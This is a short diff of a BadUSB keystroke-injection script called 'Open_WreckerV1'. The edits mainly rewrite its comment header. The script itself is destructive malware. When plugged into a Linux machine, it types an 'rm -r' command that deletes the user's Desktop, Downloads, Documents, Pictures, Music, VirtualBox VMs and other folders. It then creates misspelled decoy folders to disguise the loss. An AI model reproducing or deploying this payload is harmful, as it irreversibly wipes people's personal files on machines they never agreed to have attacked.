@@ -1,7 +1,9 @@
-REM Title:Open_WreckerV1
-REM Author: FLIZZ3R
-REM Objective: BADUSB self destruct open linux machine then create dummmy
-
+#REM Title:Open_WreckerV1
+#REM Author: FLIZZ3R
+#REM Objective: BADUSB self destruct
+# open linux machines dirs 
+#then create dummmy ND sorry txt
+# open t and wipe dirs
 DELAY 500
 WINDOWS d
 DELAY 300
@@ -10,6 +12,7 @@ DELAY 1500
 STRING rm -r Desktop Downloads Pictures snap Documents Music Public Templates 'VirtualBox VMs'
 ENTER 
 DELAY 1500 
+# make dummies
 STRING mkdir Deskop downloadz Pics Dox Music Public TEMPS Vms
 ENTER
 DELAY 500
